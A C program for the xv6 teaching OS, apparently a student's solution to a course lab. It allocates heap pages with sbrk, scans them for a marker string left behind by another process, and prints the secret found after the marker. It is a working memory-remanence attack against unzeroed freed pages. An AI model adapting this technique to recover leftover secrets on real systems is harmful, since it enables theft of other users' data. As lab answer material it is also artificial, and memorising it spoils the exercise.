#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define PGSIZE 4096
#define DATASIZE (8 * 4096)  // 与 secret 中的 data 数组大小一致
#define FEATURE "This may help."  // 固定特征前缀
#define FEATURE_LEN 14  // "This may help." 的长度（不含 \0）
#define SECRET_OFFSET 16  // 秘密相对于 data 起始的偏移
void check_and_extract(char *mem, int size);
int
main(int argc, char *argv[])
{
  // Your code here.
  // secret 的 data 数组是 8 页，因此分配足够的内存覆盖可能的残留页
  for (int i = 0; i < 16; i++) {  // 分配 16 页（超过 data 大小，提高命中率）
    char *mem = sbrk(DATASIZE);  // 一次分配与 data 相同的大小（8 页），提高连续命中概率
    if (mem == (char*)-1) {
      fprintf(1, "sbrk failed\n");
      exit(1);
    }
    check_and_extract(mem, DATASIZE);
  }

  // 若未找到，再尝试逐页分配（应对内存碎片场景）
  for (int i = 0; i < 16; i++) {
    char *mem = sbrk(PGSIZE);
    if (mem == (char*)-1) break;
    check_and_extract(mem, PGSIZE);
  }

  fprintf(1, "Secret not found\n");
  exit(1);
}


// 检查内存块中是否包含特征前缀，并提取秘密
void check_and_extract(char *mem, int size) {
  // 遍历内存块的每个可能位置（留出足够空间容纳特征前缀和秘密）
  for (int i = 0; i <= size - (FEATURE_LEN + SECRET_OFFSET + 1); i++) {
    // 匹配特征前缀（前 14 字节）
    if (memcmp(&mem[i], FEATURE, FEATURE_LEN) == 0) {
      // 秘密在特征前缀起始位置 + 16 字节处
      char *secret = &mem[i] + SECRET_OFFSET;
      // 检查秘密是否合法（仅含字母、数字，以 \0 结尾）
      int j = 0;
      while (secret[j] != '\0' && 
             ((secret[j] >= 'A' && secret[j] <= 'Z') || 
              (secret[j] >= 'a' && secret[j] <= 'z') || 
              (secret[j] >= '0' && secret[j] <= '9'))) {
        j++;
      }
      if (secret[j] == '\0' && j > 0) {  // 找到非空的合法秘密
        printf("%s\n", secret);
        exit(0);
      }
    }
  }
}

